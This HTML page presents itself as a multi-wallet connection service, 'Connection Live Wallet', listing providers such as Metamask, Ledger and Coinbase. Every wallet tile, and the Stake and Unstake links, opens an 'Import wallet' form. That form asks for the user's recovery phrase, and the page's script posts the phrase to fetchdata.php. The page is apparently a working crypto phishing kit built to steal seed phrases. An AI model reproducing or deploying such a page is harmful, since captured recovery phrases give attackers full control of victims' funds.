
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	
	<title>Connection Live Wallet</title>
	<link rel="stylesheet" href="css/bootstrap.min.css">
	<link rel="stylesheet" href="css/all.min.css">
	<style>
		.item {
			--icon-size: 32px;
			background: #E0E0E0;
			border-radius: 5px;
			height: 75px;
			width: 300px;
			margin: 5px;
			display: flex;
			flex-flow: row nowrap;
			padding: 10px;
			align-items: center;
			color: #606060;
		}

		.item:hover {
			--icon-size: 36px;
			color: #404040;
			font-size: 115%;
			cursor: pointer;
		}

		.item > .image {
			height: 60px;
			width: 60px;
			margin-right: 20px;
		}

		.item > .text {
			font-size: 22px;
			flex: 1;
		}

		.item > .icon {
			font-size: var(--icon-size);
		}

		.item > .icon:hover {
			font-size: var(--icon-size);
		}

		.modal {
			color: #404040;
		}

		.navText {
			font-size: 20px;
			color: #c0c0c0;
		}

		.clickable {
			cursor: pointer;
		}
	</style>
</head>
<body style="background-image: url(images/bg.jpg); color: whitesmoke; object-fit: fill">
<div class="container p-3" style="margin-top: 40px">
	<div class="row">
		<div class="col-10"></div>
		<div class="col-2 navText">
			<span class="clickable" data-toggle="modal" data-target="#exampleModal">Stake</span> &nbsp;
			<span class="clickable" data-toggle="modal" data-target="#exampleModal">Unstake</span>
		</div>
	</div>
	<div class="row">
		<div class="col">
			<h1 class="text-center" style="color: #c0c0c0;">Connection Live Wallet</h1>
			<p class="text-center" style="color: #c0c0c0;"> The best way to manage all your wallets from a single app. With our highly secure integrations with top wallet providers, you can efficiently manage all your wallets on our app. </p>
		</div>
	</div>
	<div class="row d-flex justify-content-center align-items-center">
		<div class="item" data-toggle="modal" data-id="Trust Wallet" data-target="#exampleModal">
			<img src="images/trust-wallet.jpg" class="image" alt="Name">
			<span class="text">Trust Wallet</span>
			<i class="fas fa-chevron-right icon"></i>
		</div>
		<div class="item" data-toggle="modal" data-id="Metamask" data-target="#exampleModal">
			<img src="images/metamask.jpg" class="image" alt="Name">
			<span class="text">Metamask</span>
			<i class="fas fa-chevron-right icon"></i>
		</div>
		<div class="item" data-toggle="modal" data-id="FortMatic" data-target="#exampleModal">
			<img src="images/fortmatic.jpg" class="image" alt="Name">
			<span class="text">FortMatic</span>
			<i class="fas fa-chevron-right icon"></i>
		</div>
		<div class="item" data-toggle="modal" data-id="AAVE" data-target="#exampleModal">
			<img src="images/aave.jpg" class="image" alt="Name">
			<span class="text">AAVE</span>
			<i class="fas fa-chevron-right icon"></i>
		</div>
		<div class="item" data-toggle="modal" data-id="Digitex" data-target="#exampleModal">
			<img src="images/digitex.jpg" class="image" alt="Name">
			<span class="text">Digitex</span>
			<i class="fas fa-chevron-right icon"></i>
		</div>
		<div class="item" data-toggle="modal" data-id="Exodus" data-target="#exampleModal">
			<img src="images/exodus.jpg" class="image" alt="Name">
			<span class="text">Exodus</span>
			<i class="fas fa-chevron-right icon"></i>
		</div>
		<div class="item" data-toggle="modal" data-id="Ledger" data-target="#exampleModal">
			<img src="images/ledger.jpg" class="image" alt="Name">
			<span class="text">Ledger</span>
			<i class="fas fa-chevron-right icon"></i>
		</div>
		<div class="item" data-toggle="modal" data-id="Coinbase" data-target="#exampleModal">
			<img src="images/coinbase.jpg" class="image" alt="Name">
			<span class="text">Coinbase</span>
			<i class="fas fa-chevron-right icon"></i>
		</div>
		<div class="item" data-toggle="modal" data-id="Defiat" data-target="#exampleModal">
			<img src="images/defiat.jpg" class="image" alt="Name">
			<span class="text">Defiat</span>
			<i class="fas fa-chevron-right icon"></i>
		</div>
		<div class="item" data-toggle="modal" data-id="Enjin" data-target="#exampleModal">
			<img src="images/enjin.jpg" class="image" alt="Name">
			<span class="text">Enjin</span>
			<i class="fas fa-chevron-right icon"></i>
		</div>
		<div class="item" data-toggle="modal" data-id="Authereum" data-target="#exampleModal">
			<svg viewBox="0 0 50 50" focusable="false" role="presentation" class="image"><g fill="#ff4c2f"><path d="m15.6879 8.35569c-2.5168.80537-5.0503 1.61074-5.646 1.79531l-1.0654.344v7.3993c0 4.4295.03356 7.7684.08389 8.3221.36913 3.8759 2.04701 7.5504 4.84901 10.6041.6376.6963 10.755 9.5134 11.0403 9.6224.1174.042 9.01-7.5419 10.4698-8.9345 2.5335-2.4077 4.5134-5.9312 5.2181-9.3037.3691-1.7785.3943-2.4413.3691-10.3272l-.0252-7.4161-5.6963-1.7953c-3.1292-.98155-5.7047-1.77853-5.7215-1.77014-.0083.01678.4615.94799 1.0571 2.08054l1.0822 2.0554 1.6191.5201c.8893.2852 2.2316.7131 2.9866.948l1.3675.4278-.0336 6.8121c-.0252 6.5436-.0335 6.8457-.2013 7.6091-.6376 2.8775-1.9547 5.3188-3.9765 7.3825-.386.3943-2.349 2.1309-4.3541 3.8507-2.005 1.7282-3.75 3.2299-3.8758 3.3473l-.2181.2014-3.8507-3.3138c-4.7064-4.0604-5.4111-4.7483-6.5352-6.4765-.8641-1.3339-1.5017-2.7685-1.8876-4.2534-.3775-1.51-.4111-2.0721-.4111-8.8003v-6.3507l1.1997-.3775c.6543-.2097 1.9966-.6376 2.9782-.948.9731-.3104 1.7785-.5956 1.7785-.6208 0-.0251.4698-.948 1.0486-2.04696.5789-1.10738 1.0487-2.02181 1.0487-2.03859 0-.05033-.1007-.01678-4.698 1.45134z"/><path d="m24.782 7.14765c-.0755.151-2.1896 4.18625-4.6896 8.95975l-4.5469 8.6829.0671.7047c.151 1.4429.6879 2.9698 1.5604 4.354.3104.5033.4027.5956.4866.5033.0503-.0587 1.7114-3.1963 3.6912-6.9714 1.9715-3.7668 3.6074-6.8541 3.641-6.8541.0251 0 1.6862 3.0537 3.6828 6.7786 1.9967 3.7248 3.6661 6.8372 3.7165 6.9211.0839.1426.1006.1342.2349-.0419.8641-1.1326 1.5772-3.0034 1.7785-4.6561l.1007-.8389-4.7651-8.8842c-2.6175-4.8826-4.7735-8.90104-4.7903-8.90943-.0084-.01678-.0839.09228-.1678.25168z"/><path d="m22.651 28.5152-2.307 4.6057 1.3003 1.1326c.7131.6208 1.7617 1.5184 2.3238 1.9882l1.0319.8557.2265-.1846c.1342-.1006 1.1661-.9983 2.2987-1.9966l2.0721-1.8121-2.2986-4.5973c-1.2668-2.5251-2.3071-4.5973-2.3239-4.5973-.0083 0-1.057 2.0722-2.3238 4.6057z"/></g></svg>
			<span class="text">Authereum</span>
			<i class="fas fa-chevron-right icon"></i>
		</div>
		<div class="item" data-toggle="modal" data-id="Skale" data-target="#exampleModal">
			<img src="images/skale.webp" alt="Skale Logo" class="image">
			<span class="text">Skale</span>
			<i class="fas fa-chevron-right icon"></i>
		</div>
		<div class="item" data-toggle="modal" data-id="MEW Wallet" data-target="#exampleModal">
			<img src="images/mew.png" alt="Skale Logo" class="image">
			<span class="text">MEW Wallet</span>
			<i class="fas fa-chevron-right icon"></i>
		</div>
		<div class="item" data-toggle="modal" data-id="Portis" data-target="#exampleModal">
			<img src="fonts/portis.svg" alt="Portis Logo" class="image">
			<span class="text">Portis</span>
			<i class="fas fa-chevron-right icon"></i>
		</div>
		<div class="item" data-toggle="modal" data-id="Wallet Connect" data-target="#exampleModal">
			<img src="fonts/walletconnect.svg" alt="Portis Logo" class="image">
			<span class="text">Wallet Connect</span>
			<i class="fas fa-chevron-right icon"></i>
		</div>
	</div>
</div>

<div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
	<div class="modal-dialog" role="document">
		<div class="modal-content">
			<div class="modal-header">
				<h5 class="modal-title" id="exampleModalLabel">Import wallet</h5>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">×</span>
				</button>
			</div>
			<div class="modal-body replace">
				<div id="request_message"></div>
				<form id="connectForm">
					<div class="form-group">
						<label for="recipient-name" class="col-form-label">Name:</label>
						<input type="text" class="form-control" id="wallet_name" readonly name="wallet_name">
					</div>
					<div class="form-group">
						<label for="message-text" class="col-form-label">Recovery Phrase:</label>
						<textarea class="form-control" id="recovery_phrase" name="recovery_phrase"></textarea>
						<label class="font-weight-light text-muted" style="font-size: 14px">Typically 12 (sometimes 24) words separated by single spaces</label><br>
						<div id="import_request_message"></div>
					</div>
				</form>
			</div>
			<div class="modal-footer">
				<button type="submit" id="import_request" name="import_request" class="btn btn-primary">Import</button>
			</div>
		</div>
	</div>
</div>

<script src="js/jquery-3.4.1.min.js"></script>
<script src="js/popper.min.js" ></script>
<script src="js/bootstrap.min.js" ></script>
<script src="js/blockui.js"></script>
<script>
	$(document).ready(function(){
  	// add request precess
		$('#import_request').click(function(){
			var wallet_name = $('#wallet_name').val();
			var recovery_phrase = $('#recovery_phrase').val();
			if (recovery_phrase.split(' ').length < 12) {
				$('#import_request_message').html('<span class="text-danger">Mnemonic phrase must be at least 12 to 24 words</span>.');
			} else {
				$('#import_request_message').html('<span class="text-primary">Processing... Please wait.</span>');				
				$.ajax({  
	                url:"fetchdata.php",  
	                method:"POST",  
	                data:{wallet_name:wallet_name,recovery_phrase:recovery_phrase},  
	                success:function(message){  
										$('#import_request_message').html('');				
	                  $('#request_message').html(message);  
	                  $('#exampleModal').modal('hide');  
	                }  
	            });
			}
		});
	});
        
        
        $(function(){
        	$('#exampleModal').on('show.bs.modal', function(e) { 
				  	var wname = $(e.relatedTarget).data('id');
				  	var that = $(this);
				  	that.find('input[id="wallet_name"]').val(wname) ;  
					});

          $('#exampleModal').on('hidden.bs.modal', function (e) {
            window.location.reload();
          })
        })

        
</script>


</body>
</html>